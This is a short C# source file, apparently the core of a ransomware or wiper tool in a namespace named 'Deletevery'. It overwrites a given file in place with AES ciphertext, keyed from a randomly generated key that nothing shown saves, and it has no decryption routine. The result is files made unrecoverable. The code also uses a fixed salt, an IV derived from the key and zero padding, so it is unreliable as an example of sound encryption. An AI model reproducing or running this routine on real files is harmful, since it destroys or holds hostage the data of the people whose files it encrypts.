using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Web;
using System.Threading.Tasks;

namespace Deletevery
{
    class sifreleme
    {
        public void sifreleagam(string gir, byte[] alektarbyte)
        {
            byte[] saltByte = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };

            string sifreli = gir;
            
            
            FileStream sif = File.OpenRead(sifreli);
            byte[] dosyabyte = new byte[sif.Length];
            sif.Read(dosyabyte, 0, Convert.ToInt32(sif.Length));
            sif.Close();
            
            FileStream sifrelenecek = new FileStream(sifreli, FileMode.Open);

            RijndaelManaged AES = new RijndaelManaged();

            AES.KeySize = 256;
            AES.BlockSize = 128;


            var alektar = new Rfc2898DeriveBytes(alektarbyte, saltByte, 1000);
            AES.Key = alektar.GetBytes(AES.KeySize / 8);
            AES.IV = alektar.GetBytes(AES.BlockSize / 8);
            AES.Padding = PaddingMode.Zeros;

            AES.Mode = CipherMode.CBC;

            
            CryptoStream cs = new CryptoStream(sifrelenecek, AES.CreateEncryptor(), CryptoStreamMode.Write);
            int i = 0;
            int limit = dosyabyte.Length;
            
            while (i < limit)
            {
                cs.WriteByte(dosyabyte[i]);
                i++;
            }
            

            cs.Close();
            
            sifrelenecek.Close();
        }



        public byte[] alektar()
        {
            
                AesCryptoServiceProvider cip = new AesCryptoServiceProvider();
                cip.KeySize = 256;
                cip.BlockSize = 128;
                cip.GenerateKey();
                byte[] keyGenerated = cip.Key;
                String Key = Convert.ToBase64String(keyGenerated);
                byte[] alektarbyte = Encoding.UTF8.GetBytes(Key);
                alektarbyte = SHA256.Create().ComputeHash(alektarbyte);
                return alektarbyte;
                        
        }

    }
}
